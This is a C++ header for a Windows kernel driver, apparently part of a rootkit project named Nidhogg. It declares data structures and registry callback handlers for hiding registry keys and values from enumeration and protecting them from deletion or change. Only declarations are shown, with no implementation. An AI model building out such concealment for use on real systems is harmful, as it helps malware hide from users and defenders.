#pragma once
#include "pch.h"

extern "C" {
	#include "WindowsTypes.hpp"
	#include "NidhoggCommon.h"
}

// Definitions.
constexpr SIZE_T REG_TYPE_PROTECTED_KEY = 0;
constexpr SIZE_T REG_TYPE_PROTECTED_VALUE = 1;
constexpr SIZE_T REG_TYPE_HIDDEN_KEY = 2;
constexpr SIZE_T REG_TYPE_HIDDEN_VALUE = 3;
constexpr SIZE_T MAX_REG_ITEMS = 256;
constexpr SIZE_T REG_VALUE_LEN = 260;
constexpr SIZE_T REG_KEY_LEN = 255;

struct RegItem {
	int RegItemsIndex;
	ULONG Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct RegKeys {
	int KeysCount;
	WCHAR* KeysPath[MAX_REG_ITEMS];
};

struct RegValues {
	int ValuesCount;
	WCHAR* ValuesPath[MAX_REG_ITEMS];
	WCHAR* ValuesName[REG_VALUE_LEN];
};

struct RegItems {
	RegKeys Keys;
	RegValues Values;
};

struct RegistryGlobals {
	RegItems ProtectedItems;
	RegItems HiddenItems;
	LARGE_INTEGER RegCookie;
	FastMutex Lock;

	void Init() {
		ProtectedItems.Keys.KeysCount = 0;
		ProtectedItems.Values.ValuesCount = 0;
		HiddenItems.Keys.KeysCount = 0;
		HiddenItems.Values.ValuesCount = 0;
		Lock.Init();
	}
};
inline RegistryGlobals rGlobals;

// Prototypes.
bool FindRegItem(RegItem& item);
bool ContainsProtectedRegKey(UNICODE_STRING regKey, int type);
bool AddRegItem(RegItem& item);
bool RemoveRegItem(RegItem& item);
bool GetNameFromKeyEnumPreInfo(KEY_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING keyName);
bool GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING keyName);
NTSTATUS RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info);
NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info);
NTSTATUS RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info);
NTSTATUS RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info);
NTSTATUS RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION* info);
NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info);
NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info);
NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info);
NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2);
